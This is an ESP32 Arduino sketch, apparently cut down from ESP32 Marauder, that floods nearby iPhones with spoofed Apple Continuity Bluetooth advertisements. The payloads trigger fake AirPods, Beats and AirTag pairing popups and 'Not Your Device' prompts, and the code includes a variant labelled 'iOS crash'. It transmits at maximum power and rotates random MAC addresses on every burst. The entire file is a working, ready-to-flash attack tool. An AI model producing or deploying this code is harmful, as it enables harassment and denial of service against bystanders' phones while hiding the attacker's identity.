// AppleSpamOnly — Boot-to-spam, Apple Continuity BLE only.
// Stripped from ESP32 Marauder. Requires NimBLE-Arduino library.
// Board: ESP32 Dev Module (or any ESP32 with BT).
// Set GENERIC_ESP32 define equivalent — just open this in the same Arduino IDE
// that already has NimBLE-Arduino available.

#include <Arduino.h>
#include <NimBLEDevice.h>
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_random.h"

extern "C" {
  uint8_t esp_base_mac_addr[6];
}

// ---------------------------------------------------------------------------
// Helpers (inlined from esp32_marauder/utils.h)
// ---------------------------------------------------------------------------
static void generateRandomMac(uint8_t* mac) {
  mac[0] = 0x02;
  for (int i = 1; i < 6; i++) mac[i] = random(0, 255);
}

// ---------------------------------------------------------------------------
// Apple Continuity payload generator
// Exact copy of the Apple case in WiFiScan::GetUniversalAdvertisementData()
// ---------------------------------------------------------------------------
static NimBLEAdvertisementData getApplePayload() {
  NimBLEAdvertisementData adv;
  uint8_t buf[31];
  uint8_t i = 0;
  uint8_t r = random(10);

  if (r < 4) {
    // ContinuityAction — modal popup on nearby iPhones
    const uint8_t actions[] = {
      0x13, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B,
      0x01, 0x06, 0x0D, 0x2B, 0x05, 0x24, 0x2F, 0x21
    };
    uint8_t act = actions[rand() % sizeof(actions)];
    uint8_t flag = 0xC0;
    if (act == 0x21) flag = 0x40;
    else if (act == 0x20 && random(2)) flag = 0xBF;
    else if (act == 0x09 && random(2)) flag = 0x40;
    buf[i++]=0x0A; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x0F; buf[i++]=0x05; buf[i++]=flag; buf[i++]=act;
    buf[i++]=random(256); buf[i++]=random(256); buf[i++]=random(256);
    adv.addData(buf, 11);

  } else if (r < 6) {
    // NotYourDevice — fake AirPods "Not Your" prompt
    const uint16_t types[] = {
      0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420,
      0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120,
      0x0520, 0x0920, 0x1720, 0x1220, 0x1620
    };
    uint16_t t = types[rand() % (sizeof(types) / sizeof(types[0]))];
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x01;
    buf[i++]=(t >> 8) & 0xFF; buf[i++]=t & 0xFF;
    buf[i++]=0x55; buf[i++]=random(256); buf[i++]=random(256);
    buf[i++]=random(256); buf[i++]=0x00; buf[i++]=0x00;
    for (int k = 0; k < 16; k++) buf[i++] = random(256);
    adv.addData(buf, 31);

  } else if (r < 8) {
    // NewDevicePopUp — AirPods / Beats pairing UI
    const uint16_t devs[] = {
      0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420, 0x1020, 0x0620,
      0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920, 0x1720, 0x1220,
      0x1620, 0x1820, 0x1920, 0x1A20, 0x1B20, 0x1C20, 0x1D20, 0x1E20,
      0x1F20, 0x0720, 0x0820, 0x0D20, 0x0420, 0x0120, 0x2420, 0x2520
    };
    uint16_t d = devs[rand() % (sizeof(devs) / sizeof(devs[0]))];
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x07;
    buf[i++]=(d >> 8) & 0xFF; buf[i++]=d & 0xFF;
    buf[i++]=0x55; buf[i++]=random(256); buf[i++]=random(256);
    buf[i++]=random(256); buf[i++]=0x00; buf[i++]=0x00;
    for (int k = 0; k < 16; k++) buf[i++] = random(256);
    adv.addData(buf, 31);

  } else if (r == 8) {
    // NewAirtagPopUp
    const uint16_t at[] = { 0x0055, 0x0030 };
    uint16_t a = at[rand() % 2];
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x05;
    buf[i++]=(a >> 8) & 0xFF; buf[i++]=a & 0xFF;
    buf[i++]=0x55; buf[i++]=random(256); buf[i++]=random(256);
    buf[i++]=random(256); buf[i++]=0x00; buf[i++]=0x00;
    for (int k = 0; k < 16; k++) buf[i++] = random(256);
    adv.addData(buf, 31);

  } else {
    // NearbyAction / iOS crash variant
    const uint8_t cacts[] = {
      0x13, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
    };
    uint8_t ca = cacts[rand() % sizeof(cacts)];
    uint8_t cf = (ca == 0x20) ? 0xBF : ((ca == 0x09 && random(2)) ? 0x40 : 0xC0);
    buf[i++]=0x10; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x0F; buf[i++]=0x05; buf[i++]=cf; buf[i++]=ca;
    buf[i++]=random(256); buf[i++]=random(256); buf[i++]=random(256);
    buf[i++]=0x00; buf[i++]=0x00; buf[i++]=0x10;
    buf[i++]=random(256); buf[i++]=random(256); buf[i++]=random(256);
    adv.addData(buf, 17);
  }

  return adv;
}

// ---------------------------------------------------------------------------
static NimBLEAdvertising* pAdv = nullptr;

void setup() {
  // Randomize base MAC so BT address starts fresh each boot
  uint8_t smac[6];
  generateRandomMac(smac);
  esp_base_mac_addr_set(smac);

  NimBLEDevice::init("");

  // Force MAX TX power on all three BLE power slots (same as Marauder executeBLESpam)
  NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
  NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_SCAN);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  NimBLEServer* pServer = NimBLEDevice::createServer();
  pAdv = pServer->getAdvertising();
  pAdv->setMinInterval(0x20);  // 32 * 0.625ms = 20ms
  pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
}

void loop() {
  // Burst 6 advertisements per tick, rotating MAC each burst (Marauder parity)
  for (uint8_t n = 0; n < 6; n++) {
    uint8_t rmac[6];
    generateRandomMac(rmac);
    rmac[5] |= 0xC0;  // random static address — top 2 bits must be set
    NimBLEDevice::setOwnAddr(rmac);

    NimBLEAdvertisementData ad = getApplePayload();
    pAdv->setAdvertisementData(ad);
    pAdv->start();
    delay(40);
    pAdv->stop();
  }
}
